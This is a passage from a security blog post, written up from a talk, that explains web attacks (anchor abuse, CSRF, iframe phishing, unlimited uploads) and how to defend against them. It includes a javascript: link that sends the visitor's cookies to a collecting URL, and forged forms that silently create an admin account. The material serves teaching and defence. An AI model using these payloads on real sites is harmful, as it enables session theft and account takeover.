.</p><p>Also, try not to put any UGC into the page as a part of the code, if you can&rsquo;t overcome this requirement make sure that the <code>&lt;/script></code> sub-string is split into <code>'&lt;/' + 'script>'</code>, for example.</p><h3 id=anchor-abuse>Anchor abuse&nbsp;<a class="undecorated heading-anchor" href=#anchor-abuse>#</a></h3><p>To be honest, I&rsquo;m not sure if anyone call it like this, so I probably coined the term here.</p><p>I&rsquo;ve already briefly mentioned this in the
<a href=#web-standards-and-apis>Web-standards and APIs</a>
section but links on pages can be very dangerous. So, think twice before clicking a link.</p><h4 id=how-to-attack-3>How to attack&nbsp;<a class="undecorated heading-anchor" href=#how-to-attack-3>#</a></h4><p>This type of attack is related to XSS because if you let your users to put unfiltered UGC in <code>href</code> link attributes on your web-site, you basically let them run XSS.</p><div class=highlight><pre tabindex=0 style=color:#c9c9c9;background-color:#282c34;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-html data-lang=html><span style=display:flex><span><span style=color:#56b6c2>&lt;</span><span style=color:#bc74c4>a</span> <span style=color:#bc74c4>href</span><span style=color:#bc74c4>=</span><span style=color:#82cc6a>&#34;javascript:var e=document.createElement(&#39;img&#39;);e.src=&#39;https://rdner.de/inbox?sess=&#39;+encodeURIComponent(document.cookie);document.body.appendChild(e);&#34;</span><span style=color:#56b6c2>&gt;</span>
</span></span><span style=display:flex><span>  Click me!
</span></span><span style=display:flex><span><span style=color:#56b6c2>&lt;/</span><span style=color:#bc74c4>a</span><span style=color:#56b6c2>&gt;</span>
</span></span></code></pre></div><p>Clicking this link means sending your cookies/session to an attacker.</p><p>Besides that, when you go to any website via a link, keep in mind that the new website always knows from what URL you came, because there is JavaScript API <code>document.referrer</code> to get this information. So, if there is something sensitive in your URL it will be exposed via links opening.</p><p>I&rsquo;ve already told you
<a href=#web-standards-and-apis>earlier</a>
about the
<a href=https://mathiasbynens.github.io/rel-noopener/ rel="nofollow noreferrer" target=_blank>vulnerability</a>
that
<a href=https://twitter.com/mathias rel="nofollow noreferrer" target=_blank>Mathias Bynens</a>
found in 2016 which lets an attacker site to change the content of another browser tab where the malicious link was opened from.</p><h4 id=consequences-3>Consequences&nbsp;<a class="undecorated heading-anchor" href=#consequences-3>#</a></h4><ul><li>Same as XSS</li><li>Exposing sensitive data from URL</li><li>Giving away your credentials on a phishing page</li></ul><h4 id=how-to-protect-3>How to protect&nbsp;<a class="undecorated heading-anchor" href=#how-to-protect-3>#</a></h4><ul><li>Don&rsquo;t allow any schema except <code>http:</code> and <code>https:</code> in your URLs if they are created by your users</li><li>Build a proxy page where your users go after they click an external link, this proxy filters out all the things like <code>document.referrer</code></li><li><strong>NEVER</strong> store sensitive data in URLs, like access tokens, they can get leaked</li><li><strong>ALWAYS</strong> use <code>rel="noopener noreferrer"</code> attribute for your external links</li></ul><h3 id=cross-site-request-forgery-csrf>Cross Site Request Forgery (CSRF)&nbsp;<a class="undecorated heading-anchor" href=#cross-site-request-forgery-csrf>#</a></h3><p>A lot of developers I meet know about CSRF tokens and that they should use a library to implement it on their web-sites but not many people actually know what they protect against.</p><h4 id=how-to-attack-4>How to attack&nbsp;<a class="undecorated heading-anchor" href=#how-to-attack-4>#</a></h4><p>So, what is it and how an attacker can exploit the vulnerability? Imagine you have an endpoint on a closed (invitation only) website where administrators create new users, also they can select what privileges the users have when they create them and the whole HTML of that form looks like this:</p><div class=highlight><pre tabindex=0 style=color:#c9c9c9;background-color:#282c34;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-html data-lang=html><span style=display:flex><span><span style=color:#56b6c2>&lt;</span><span style=color:#bc74c4>form</span> <span style=color:#bc74c4>method</span><span style=color:#bc74c4>=</span><span style=color:#82cc6a>&#34;post&#34;</span> <span style=color:#bc74c4>action</span><span style=color:#bc74c4>=</span><span style=color:#82cc6a>&#34;/users&#34;</span><span style=color:#56b6c2>&gt;</span>
</span></span><span style=display:flex><span>  Email: <span style=color:#56b6c2>&lt;</span><span style=color:#bc74c4>input</span> <span style=color:#bc74c4>type</span><span style=color:#bc74c4>=</span><span style=color:#82cc6a>&#34;text&#34;</span> <span style=color:#bc74c4>name</span><span style=color:#bc74c4>=</span><span style=color:#82cc6a>&#34;email&#34;</span><span style=color:#56b6c2>&gt;</span>
</span></span><span style=display:flex><span>  Is admin? <span style=color:#56b6c2>&lt;</span><span style=color:#bc74c4>input</span> <span style=color:#bc74c4>type</span><span style=color:#bc74c4>=</span><span style=color:#82cc6a>&#34;checkbox&#34;</span> <span style=color:#bc74c4>name</span><span style=color:#bc74c4>=</span><span style=color:#82cc6a>&#34;isadmin&#34;</span><span style=color:#56b6c2>&gt;</span>
</span></span><span style=display:flex><span>  <span style=color:#56b6c2>&lt;</span><span style=color:#bc74c4>input</span> <span style=color:#bc74c4>type</span><span style=color:#bc74c4>=</span><span style=color:#82cc6a>&#34;submit&#34;</span> <span style=color:#bc74c4>value</span><span style=color:#bc74c4>=</span><span style=color:#82cc6a>&#34;Create&#34;</span><span style=color:#56b6c2>&gt;</span>
</span></span><span style=display:flex><span><span style=color:#56b6c2>&lt;/</span><span style=color:#bc74c4>form</span><span style=color:#56b6c2>&gt;</span>
</span></span></code></pre></div><p>When you submit this form it sends a POST request to the <code>/users</code> endpoint, the request cookie contains the current administrator session and the request body contains this data: <code>email=denis%40rdner.de&amp;isadmin=on</code>. After the request is successfully handled by the server, it sends an invitation to the given email and provides credentials for the user giving it administrative privileges.</p><p>Simple, right? I&rsquo;ve seen hundreds of web-sites like this in my early years. What&rsquo;s the problem with this?</p><p>Well, the problem is that you can send this request from any other web-site, the form does not have to be on your web-site, it can be anywhere else on the internet and it&rsquo;s still able to send the same request to your <code>/users</code> endpoint tricking the administrator into it, for example having this form instead.</p><div class=highlight><pre tabindex=0 style=color:#c9c9c9;background-color:#282c34;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-html data-lang=html><span style=display:flex><span><span style=color:#56b6c2>&lt;</span><span style=color:#bc74c4>form</span> <span style=color:#bc74c4>method</span><span style=color:#bc74c4>=</span><span style=color:#82cc6a>&#34;post&#34;</span> <span style=color:#bc74c4>action</span><span style=color:#bc74c4>=</span><span style=color:#82cc6a>&#34;https://rdner.de/admin/users&#34;</span><span style=color:#56b6c2>&gt;</span>
</span></span><span style=display:flex><span>  Would you like to subscribe to our newsletter?
</span></span><span style=display:flex><span>  Email: <span style=color:#56b6c2>&lt;</span><span style=color:#bc74c4>input</span> <span style=color:#bc74c4>type</span><span style=color:#bc74c4>=</span><span style=color:#82cc6a>&#34;text&#34;</span> <span style=color:#bc74c4>name</span><span style=color:#bc74c4>=</span><span style=color:#82cc6a>&#34;we-dont-care&#34;</span><span style=color:#56b6c2>&gt;</span>
</span></span><span style=display:flex><span>  <span style=color:#56b6c2>&lt;</span><span style=color:#bc74c4>input</span> <span style=color:#bc74c4>type</span><span style=color:#bc74c4>=</span><span style=color:#82cc6a>&#34;hidden&#34;</span> <span style=color:#bc74c4>name</span><span style=color:#bc74c4>=</span><span style=color:#82cc6a>&#34;email&#34;</span> <span style=color:#bc74c4>value</span><span style=color:#bc74c4>=</span><span style=color:#82cc6a>&#34;attacker@gmail.com&#34;</span><span style=color:#56b6c2>&gt;</span>
</span></span><span style=display:flex><span>  <span style=color:#56b6c2>&lt;</span><span style=color:#bc74c4>input</span> <span style=color:#bc74c4>type</span><span style=color:#bc74c4>=</span><span style=color:#82cc6a>&#34;hidden&#34;</span> <span style=color:#bc74c4>name</span><span style=color:#bc74c4>=</span><span style=color:#82cc6a>&#34;isadmin&#34;</span> <span style=color:#bc74c4>value</span><span style=color:#bc74c4>=</span><span style=color:#82cc6a>&#34;on&#34;</span><span style=color:#56b6c2>&gt;</span>
</span></span><span style=display:flex><span>  <span style=color:#56b6c2>&lt;</span><span style=color:#bc74c4>input</span> <span style=color:#bc74c4>type</span><span style=color:#bc74c4>=</span><span style=color:#82cc6a>&#34;submit&#34;</span> <span style=color:#bc74c4>value</span><span style=color:#bc74c4>=</span><span style=color:#82cc6a>&#34;Subscribe&#34;</span><span style=color:#56b6c2>&gt;</span>
</span></span><span style=display:flex><span><span style=color:#56b6c2>&lt;/</span><span style=color:#bc74c4>form</span><span style=color:#56b6c2>&gt;</span>
</span></span></code></pre></div><p>This form above would send a POST request to your <code>/users</code> endpoint (even if it&rsquo;s on a different domain) with the request body <code>we-dont-care=some%40gmail.com&amp;email=attacker%40gmail.com&amp;isadmin=on</code> (which is exactly the same as it was first time but contains the email of the attacker). As you can see, we show a fake input for an email and pretend we&rsquo;re going to use it for a newsletter subscription but in fact we have two other hidden input fields with real data we&rsquo;re going to send to the server.</p><p>What about administrator permissions you need to perform this request, you might ask? Well cookies work by domains, if you&rsquo;re an admin on <code>rdner.de</code> and you submit this form on <code>example.com</code> it will redirect you to <code>rdner.de</code> where your administrative permissions work and your cookie that identifies your session will be automatically sent to <code>rdner.de</code>, so the request will be successfully handled and the user for the attacker email <code>attacker@gmail.com</code> will be created and the attacker will become an administrator of your system.</p><p>This is what request cross site request forgery means. And again, the
<a href=https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS rel="nofollow noreferrer" target=_blank>CORS policy</a>
would not help here.</p><p>By the way, if you don&rsquo;t use POST/PUT as your HTTP methods on such endpoints it&rsquo;s even worse. The attacker would just need to put an image</p><div class=highlight><pre tabindex=0 style=color:#c9c9c9;background-color:#282c34;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-html data-lang=html><span style=display:flex><span><span style=color:#56b6c2>&lt;</span><span style=color:#bc74c4>img</span> <span style=color:#bc74c4>href</span><span style=color:#bc74c4>=</span><span style=color:#82cc6a>&#34;https://rdner.de/admin/users?operation=create&amp;email=attacker%40gmail.com&amp;isadmin=on&#34;</span><span style=color:#56b6c2>&gt;</span>
</span></span></code></pre></div><p>on their web-site and it&rsquo;s enough to open this page by an administrator in order to create a user for the attacker.</p><h4 id=consequences-4>Consequences&nbsp;<a class="undecorated heading-anchor" href=#consequences-4>#</a></h4><p>The attacker is able to:</p><p>Impersonate a user and perform a request on its behalf gaining administrative permissions, updating, deleting other users (in older systems that use POST for this), etc.</p><h4 id=how-to-protect-4>How to protect&nbsp;<a class="undecorated heading-anchor" href=#how-to-protect-4>#</a></h4><p>Okay, now I hope you understand the problem, let&rsquo;s talk about CSRF protection which is a CSRF token.</p><p>There are several different ways of implementing the CSRF token but I personally prefer the
<a href=https://www.owasp.org/index.php/Cross-Site_Request_Forgery_%28CSRF%29_Prevention_Cheat_Sheet#Encrypted_Token_Pattern rel="nofollow noreferrer" target=_blank>encrypted token pattern</a>
.</p><p>To implement it you just need to generate an encryption pass-phrase for you app and store it in a secure way. Then in your app implementation generate a new JSON object that contains:</p><ul><li>Some random value (for the sake of entropy)</li><li>Some kind of ID (can be the ID of the current user)</li><li>The generation time-stamp (so you can expire the token)</li></ul><p>Once you have it, you can encrypt this JSON object with
<a href=https://en.wikipedia.org/wiki/Advanced_Encryption_Standard rel="nofollow noreferrer" target=_blank>AES256</a>
/
<a href=https://en.wikipedia.org/wiki/Galois/Counter_Mode rel="nofollow noreferrer" target=_blank>GCM</a>
using the pass-phrase you&rsquo;ve generated earlier. AES256 is the strongest encryption standard at the moment, GCM is a mode of operation that allows you to verify if the encrypted content is unchanged by an attacker. Unlike GCM most of the operation modes guarantee you confidentiality but not integrity, that means nobody can read the encrypted data but it&rsquo;s possible to change it. Theoretically, with some luck, it&rsquo;s possible to hit right bits and change the encrypted JSON in a way that works for the attacker&rsquo;s benefit. But I&rsquo;d say it&rsquo;s extremely unlikely, especially if you have a limited expiration time for the token.</p><p>So, you have the token, now what? Depends on your app implementation but if you generate the form on server it&rsquo;s simple as changing the form to look like this:</p><div class=highlight><pre tabindex=0 style=color:#c9c9c9;background-color:#282c34;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-html data-lang=html><span style=display:flex><span><span style=color:#56b6c2>&lt;</span><span style=color:#bc74c4>form</span> <span style=color:#bc74c4>method</span><span style=color:#bc74c4>=</span><span style=color:#82cc6a>&#34;post&#34;</span> <span style=color:#bc74c4>action</span><span style=color:#bc74c4>=</span><span style=color:#82cc6a>&#34;/users&#34;</span><span style=color:#56b6c2>&gt;</span>
</span></span><span style=display:flex><span>  Email: <span style=color:#56b6c2>&lt;</span><span style=color:#bc74c4>input</span> <span style=color:#bc74c4>type</span><span style=color:#bc74c4>=</span><span style=color:#82cc6a>&#34;text&#34;</span> <span style=color:#bc74c4>name</span><span style=color:#bc74c4>=</span><span style=color:#82cc6a>&#34;email&#34;</span><span style=color:#56b6c2>&gt;</span>
</span></span><span style=display:flex><span>  Is admin? <span style=color:#56b6c2>&lt;</span><span style=color:#bc74c4>input</span> <span style=color:#bc74c4>type</span><span style=color:#bc74c4>=</span><span style=color:#82cc6a>&#34;checkbox&#34;</span> <span style=color:#bc74c4>name</span><span style=color:#bc74c4>=</span><span style=color:#82cc6a>&#34;isadmin&#34;</span><span style=color:#56b6c2>&gt;</span>
</span></span><span style=display:flex><span>  <span style=color:#56b6c2>&lt;</span><span style=color:#bc74c4>input</span> <span style=color:#bc74c4>type</span><span style=color:#bc74c4>=</span><span style=color:#82cc6a>&#34;hidden&#34;</span> <span style=color:#bc74c4>name</span><span style=color:#bc74c4>=</span><span style=color:#82cc6a>&#34;csrf&#34;</span> <span style=color:#bc74c4>value</span><span style=color:#bc74c4>=</span><span style=color:#82cc6a>&#34;some_encrypted_token_value_here&#34;</span><span style=color:#56b6c2>&gt;</span>
</span></span><span style=display:flex><span>  <span style=color:#56b6c2>&lt;</span><span style=color:#bc74c4>input</span> <span style=color:#bc74c4>type</span><span style=color:#bc74c4>=</span><span style=color:#82cc6a>&#34;submit&#34;</span> <span style=color:#bc74c4>value</span><span style=color:#bc74c4>=</span><span style=color:#82cc6a>&#34;Create&#34;</span><span style=color:#56b6c2>&gt;</span>
</span></span><span style=display:flex><span><span style=color:#56b6c2>&lt;/</span><span style=color:#bc74c4>form</span><span style=color:#56b6c2>&gt;</span>
</span></span></code></pre></div><p>This form will include the token into the request body and you can check its validity on server and accept or reject the request based on that. This guaranties you that the request comes from the form that was generated on your page and nowhere else.</p><h3 id=iframe-related-vectors>iframe-related vectors&nbsp;<a class="undecorated heading-anchor" href=#iframe-related-vectors>#</a></h3><p>It used to be very big in the past but now it&rsquo;s mostly about phishing.</p><h4 id=how-to-attack-5>How to attack&nbsp;<a class="undecorated heading-anchor" href=#how-to-attack-5>#</a></h4><p>As you
<a href=https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe rel="nofollow noreferrer" target=_blank>might know</a>
people can use <code>iframe</code> element to embed other web-sites in their page. And it does not sound like much first but it means that they can also put any elements on top of this <code>iframe</code>, something like absolutely-positioned inputs. It can trick users into typing some data like credentials to the attacker&rsquo;s inputs when they think they interact with a real web-site.</p><p>In old versions of IE it was possible to catch all keyboard events from an <code>iframe</code> and implement something like a key logger but it&rsquo;s all in the past now, so we should not care much. However, who knows how many <code>iframe</code>-related bugs are still there.</p><h4 id=consequences-5>Consequences&nbsp;<a class="undecorated heading-anchor" href=#consequences-5>#</a></h4><p>The attacker is able to use phishing techniques and trick users into giving away their personal data.</p><h4 id=how-to-protect-5>How to protect&nbsp;<a class="undecorated heading-anchor" href=#how-to-protect-5>#</a></h4><p>It&rsquo;s a very good idea to forbid browsers to embed your web-site in an <code>iframe</code>. You have 2 options to do so:</p><ul><li>Serve <code>X-Frame-Options: deny</code> header</li><li>Use
<a href=https://content-security-policy.com/ rel="nofollow noreferrer" target=_blank>CSP</a>
directive <code>frame-ancestors 'none'</code>, we&rsquo;ll also talk about CSP a bit later.</li></ul><h3 id=unrestricted-file-upload>Unrestricted file upload&nbsp;<a class="undecorated heading-anchor" href=#unrestricted-file-upload>#</a></h3><p>This is one was particularly big when node.js got popular and everyone started exposing their apps to the public with no proxy in front of it.</p><h4 id=how-to-attack-6>How to attack&nbsp;<a class="undecorated heading-anchor" href=#how-to-attack-6>#</a></h4><p>You see, in node.js there is no default upload limit for an HTTP request, so if you see code like this:</p><div class=highlight><pre tabindex=0 style=color:#c9c9c9;background-color:#282c34;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-javascript data-lang=javascript><span style=display:flex><span><span style=color:#7fbaf5>var</span> data <span style=color:#bc74c4>=</span> <span style=color:#82cc6a>&#39;&#39;</span><span style=color:#56b6c2>;</span>
</span></span><span style=display:flex><span>response<span style=color:#56b6c2>.</span>on<span style=color:#56b6c2>(</span><span style=color:#82cc6a>&#39;data&#39;</span><span style=color:#56b6c2>,</span> <span style=color:#7fbaf5>function</span><span style=color:#56b6c2>(</span>chunk<span style=color:#56b6c2>)</span> <span style=color:#56b6c2>{</span>
</span></span><span style=display:flex><span>  data <span style=color:#bc74c4>+=</span> chunk<span style=color:#56b6c2>.</span>toString<span style=color:#56b6c2>();</span>
</span></span><span style=display:flex><span><span style=color:#56b6c2>});</span>
</span></span><span style=display:flex><span>response<span style=color:#56b6c2>.</span>on<span style=color:#56b6c2>(</span><span style=color:#82cc6a>&#39;end&#39;</span><span style=color:#56b6c2>,</span> <span style=color:#7fbaf5>function</span><span style=color:#56b6c2>()</span> <span style=color:#56b6c2>{</span>
</span></span><span style=display:flex><span>  store<span style=color:#56b6c2>(</span>data<span style=color:#56b6c2>);</span>
</span></span><span style=display:flex><span><span style=color:#56b6c2>});</span>
</span></span></code></pre></div><p>You can&rsquo;t run this code on its own because it does not have any upload limit and an attacker can stream data into the server with no limit until the server crashes with <code>OutOfMemory</code> exception. In this case, no data, permissions, access would leak but it&rsquo;s a good attack vector to cause
<a href=https://en.wikipedia.org/wiki/Denial-of-service_attack rel="nofollow noreferrer" target=_blank>DoS</a>
(denial of service). So, your web-site becomes unusable for normal users. Also, if you server just pipes the stream to the file system it can cause the file system to get full and in some cases you would not be able to start the server again.</p><h4 id=consequences-6>Consequences&nbsp;<a class="undecorated heading-anchor" href=#consequences-6>#</a></h4><p>The attacker is able to crash your server and cause denial of service.</p><h4 id=how-to-protect-6>How to protect&nbsp;<a class="undecorated heading-anchor" href=#how-to-protect-6>#</a></h4><p>The easiest option is to have some kind of proxy in front of your web-service, like NGINX. Most of the web-servers/proxies have a decent default configuration that includes upstream limiting. Or set/implement these limits in your app.</p><h2 id=preventive-measures>Preventive measures&nbsp;<a class="undecorated heading-anchor" href=#preventive-measures>#</a></h2><p>If you start thinking about security aspects of your app from the very beginning, including design steps, you will probably design/configure/deploy it in a way that would prevent most of the listed attacks. And there are some standards/technologies that can help you do that.</p><h3 id=cross-origin-resource-sharing-cors>Cross-Origin Resource Sharing (CORS)&nbsp;<a class="undecorated heading-anchor" href=#cross-origin-resource-sharing-cors>#</a></h3><p>I know, I mentioned several times that
<a href=https://en.wikipedia.org/wiki/Cross-origin_resource_sharing rel="nofollow noreferrer" target=_blank>CORS</a>
would not help against CSRF and XSS vulnerabilites but it&rsquo;s actually good against some other
<a href=https://en.wikipedia.org/wiki/Ajax_%28programming%29 rel="nofollow noreferrer" target=_blank>AJAX</a>
-relates attack vectors, so it&rsquo;s a good idea to configure CORS as strict as possible for your app.</p><p>Some things you can do using CORS:</p><ul><li>Limit where your HTTP API can be accessed from</li><li>Limit what headers are allowed in requests</li><li>Limit what HTTP methods are allowed in requests</li></ul><p>In order to do so your HTTP API must support <code>OPTIONS</code> requests with following headers:</p><ul><li>Access-Control-Allow-Origin</li><li>Access-Control-Allow-Methods</li><li>Access-Control-Allow-Headers</li><li>etc.</li></ul><p>There is a very good documentation regarding CORS configuration on MDN, so please
<a href=https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS rel="nofollow noreferrer" target=_blank>read it</a>
.</p><h3 id=content-security-policy-csp>Content Security Policy (CSP)&nbsp;<a class="undecorated heading-anchor" href=#content-security-policy-csp>#</a></h3><p><a href=https://content-security-policy.com/ rel="nofollow noreferrer" target=_blank>CSP</a>
is a very powerful tool when it comes to strict web-app policies.</p><p>Header <code>Content-Security-Policy</code> is supported by browsers since 2014-2015.</p><p>Features:</p><ul><li>Limit where to download media from: fonts, styles, scripts. You can even sign or limit to a certain
<a href=https://en.wikipedia.org/wiki/Secure_Hash_Algorithms rel="nofollow noreferrer" target=_blank>SHA</a></li><li>Limit where the app can make AJAX requests</li><li>Limit what frames are allowed and if it’s allowed to embed the web-app in an <code>iframe</code></li><li>Limit where to submit forms from the page</li><li>Sandbox mode – disable/enable JavaScript, modals, pop-ups, forms, etc</li></ul><p>Crucial for high-security parts of your app like a login form or when you allow external user-defined content on your page.</p><p>Read more at
<a href=https://content-security-policy.com/ rel="nofollow noreferrer" target=_blank>content-security-policy.com</a>
.</p><h2 id=before-you-go>Before you go&nbsp;<a class="undecorated heading-anchor" href=#before-you-go>#</a></h2><p>I hope you&rsquo;ve learned something new from this article and with all of this in mind you will design your next project better and more secure.</p><p>Once I read the article &ldquo;
<a href=https://blog.cryptographyengineering.com/2018/09/23/why-im-leaving-chrome/ rel="nofollow noreferrer" target=_blank>Why I’m done with Chrome</a>
&rdquo; by Matthew Green and I really liked the phrase he used there:</p><figure class=quote><span>&ldquo;</span><blockquote><p>Trust is not a renewable resource</p></blockquote><span>&bdquo;</span></figure><p>Because it&rsquo;s really not, even recent events with Facebook can prove this point. Does not matter how big the company is, it&rsquo;s really hard to earn the trust back after you failed your users. It&rsquo;s much better to spend more time thinking, planning, building a stronger app than solve a PR nightmare and be sorry.</p><h2 id=links>Links&nbsp;<a class="undecorated heading-anchor" href=#links>#</a></h2><ul><li>Open Web-Application Security Project
<a href=https://www.owasp.org rel="nofollow noreferrer" target=_blank>https://www.owasp.org</a>
– basically wikipedia-like source about web-security</li><li><a href=https://www.owasp.org/images/7/72/OWASP_Top_10-2017_%28en%29.pdf.pdf rel="nofollow noreferrer" target=_blank>Top 10 vulnerabilities 2017</a></li><li><a href=https://github.com/rdner/security-nightmare rel="nofollow noreferrer" target=_blank>Demo project on Github</a>
I prepared for the listed attack vectors</li><li>Since this article is a talk write up, here is
<a href=slides.pdf>my slides</a>
for the given talk.</li></ul><p>If you have any feedback about the article please feel free to contact me via email
<a href=mailto:denis@rdner.de rel="nofollow noreferrer" target=_blank>denis@rdner.de</a>
.</p></div></article><aside class=separated aria-label="Recent Posts"><h2>Other Posts</h2><ul class="no-bullets undecorated previews"><li class="posts-section preview with-cover shadowed" style=background-image:url(/posts/sport/im-70.3/cover.jpg)><a class=unpadded href=/posts/sport/im-70.3/><article><header><h3 class=title>My Road to IRONMAN 70.3</h3></header><div class=flex-expanded></div><div class=details><p class=content>This is a story of a big life change.</p><div class=facts><time datetime="2023-10-01 00:00:00 +0000 UTC">Oct 1, 2023</time>
&nbsp;/&nbsp;
~4400&nbsp;words
&nbsp;/&nbsp;21&nbsp;min&nbsp;read</div></div></article></a></li><li class="posts-section preview with-cover shadowed" style=background-image:url(/posts/sport/why-run/cover.jpg)><a class=unpadded href=/posts/sport/why-run/><article><header><h3 class=title>Why Run?</h3></header><div class=flex-expanded></div><div class=details><p class=content>Recently quite a few people asked me "Why are you running?", sometimes even followed by something like "it's stupid" or whatever to hint me that I should not. I hope to be able to just send a link to this article next time.</p><div class=facts><time datetime="2022-11-11 00:00:00 +0000 UTC">Nov 11, 2022</time>
&nbsp;/&nbsp;
~2100&nbsp;words
&nbsp;/&nbsp;10&nbsp;min&nbsp;read</div></div></article></a></li><li class="posts-section preview with-cover shadowed" style=background-image:url(/posts/tech/security/privacy-tips/cover.jpg)><a class=unpadded href=/posts/tech/security/privacy-tips/><article><header><h3 class=title>Paranoid Habits. Privacy Tips</h3></header><div class=flex-expanded></div><div class=details><p class=content>This is another write up of my recent talk where I share some information about the modern era of data collection and how you can keep your privacy. At least partially.</p><div class=facts><time datetime="2021-03-10 12:01:16 +0100 +0100">Mar 10, 2021</time>
&nbsp;/&nbsp;
~4000&nbsp;words
&nbsp;/&nbsp;19&nbsp;min&nbsp;read</div></div></article></a></li><li class="posts-section preview with-cover shadowed" style=background-image:url(/posts/motorcycle/granada-spain/cover.jpg)><a class=unpadded href=/posts/motorcycle/granada-spain/><article><header><h3 class=title>Riding in Granada, Spain</h3></header><div class=flex-expanded></div><div class=details><p class=content>This year comes to its end and it's time to summarize. The best thing that happened to me this year was the motorbike trip in Spain, I'd like to share what was so amazing about it. Videos included.</p><div class=facts><time datetime="2019-12-29 00:00:00 +0100 +0100">Dec 29, 2019</time>
&nbsp;/&nbsp;
~1100&nbsp;words
&nbsp;/&nbsp;5&nbsp;min&nbsp;read</div></div></article></a></li></ul></aside></div></main><footer class=site-footer><a href=https://rdner.de/>rdner's blog</a>&copy;&nbsp;2015-2025&nbsp;by&nbsp;Denis Rechkunov&nbsp;<a href=mailto:denis@rdner.de>(denis@rdner.de)</a>.<br>All content is licensed under <a href=https://creativecommons.org/licenses/by-nc-sa/4.0/>CC BY-NC-SA 4.0</a><img src=https://mirrors.creativecommons.org/presskit/icons/cc.svg style=max-width:1em;max-height:1em;margin-left:.2em alt="Creative Commons"><img src=https://mirrors.creativecommons.org/presskit/icons/by.svg style=max-width:1em;max-height:1em;margin-left:.2em alt=Attribution><img src=https://mirrors.creativecommons.org/presskit/icons/nc.svg style=max-width:1em;max-height:1em;margin-left:.2em alt=Non-commercial><img src=https://mirrors.creativecommons.org/presskit/icons/sa.svg style=max-width:1em;max-height:1em;margin-left:.2em alt=Share-alike>.<script type=text/javascript>w=document.getElementById("whoami"),w&&(w.onclick=()=>eval(atob("ZG9jdW1lbnQubG9jYXRpb24gPSAiL3ZpZGVvcy8xLm1wNCI=")))</script></footer></body></html>